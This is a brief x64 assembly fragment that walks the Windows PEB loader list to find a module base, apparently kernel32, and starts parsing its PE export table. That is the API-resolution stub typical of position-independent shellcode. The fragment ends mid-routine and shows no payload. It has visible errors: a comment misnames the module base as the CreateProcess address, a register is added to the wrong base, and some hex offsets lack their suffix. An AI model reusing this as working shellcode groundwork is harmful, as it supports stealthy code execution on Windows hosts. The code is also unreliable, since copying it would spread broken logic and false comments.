start PROC

  mov rax, gs:[060h]
  mov rax, [rax + 018h]
  mov rsi, [rax + 020h]
  mov rsi, [rsi]
  mov rsi, [rsi]
  mov r15, [rsi + 020h]
;r15 = CreateProcess addr

  mov eax, dword ptr [r15 + 03C]
  add rax, r15

  mov edx, dword ptr [rax + 088h]
  add rdx, r15

  mov r8d, dword ptr [rdx + 024h]
  add rdx, r15

  mov r9d, dword ptr [rdx + 020h]
  add r9, r15

  mov r10d, dword ptr [rdx + 01C]
  add r10, r15

